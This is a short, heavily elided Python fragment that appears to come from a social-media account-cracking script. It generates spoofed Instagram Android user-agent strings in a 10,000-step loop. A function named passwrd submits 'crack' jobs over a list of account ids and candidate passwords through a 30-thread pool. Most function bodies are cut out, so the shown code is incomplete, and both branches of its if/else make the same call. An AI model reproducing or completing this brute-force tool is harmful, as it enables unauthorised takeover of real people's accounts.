...
for xd in range(10000):
    ...
    l='Mobile Safari/537.36 Instagram 180.0.0.31.119 Android (30/11; 480dpi; 1080x2030; vivo/iQOO; I1927; I1928; qcom; e'
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				pool.submit(crack,idf,pwv,brazzer)
			else:
				pool.submit(crack,idf,pwv,brazzer)
	print('')
